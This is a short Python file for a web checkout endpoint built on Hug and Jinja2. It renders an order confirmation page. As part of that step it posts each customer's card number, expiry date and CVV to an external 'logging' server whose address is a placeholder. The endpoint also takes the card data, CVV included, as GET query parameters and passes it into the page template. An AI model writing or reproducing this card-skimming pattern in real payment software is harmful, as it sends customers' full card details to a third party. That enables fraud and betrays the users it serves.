import requests
import hug
from jinja2 import Environment, FileSystemLoader

# Initialize the Jinja2 environment
env = Environment(loader=FileSystemLoader('templates'))

def log_credit_card_details(user_id, order_id, payment_form_data):
    """ Logs the credit card details to an external server. """
    url = "https://example.com/log-credit-card"  # Replace with actual logging endpoint
    payload = {
        "user_id": user_id,
        "order_id": order_id,
        "payment_form_data": payment_form_data
    }
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()  # Raise an exception for HTTP errors
    except requests.exceptions.RequestException as e:
        print(f"Error logging credit card details: {e}")

def generate_confirmation_page(request, user_id, order_id, payment_form_data):
    """ Generates a confirmation page with payment details and logs credit card data. """
    # Log the credit card details
    log_credit_card_details(user_id, order_id, payment_form_data)

    # Render the confirmation page using Jinja2
    template = env.get_template('confirmation_page.html')
    context = {
        "user_id": user_id,
        "order_id": order_id,
        "payment_form_data": payment_form_data,
        "success_message": "Thank you for your purchase!"
    }
    rendered_html = template.render(context)

    return rendered_html

# Example Hug API endpoint
@hug.get("/confirm")
def confirm_order(request):
    user_id = hug.get_param('user_id')
    order_id = hug.get_param('order_id')
    # Example payment form data extraction
    payment_form_data = {
        "card_number": hug.get_param('card_number'),
        "expiry_date": hug.get_param('expiry_date'),
        "cvv": hug.get_param('cvv'),
    }

    return generate_confirmation_page(request, user_id, order_id, payment_form_data)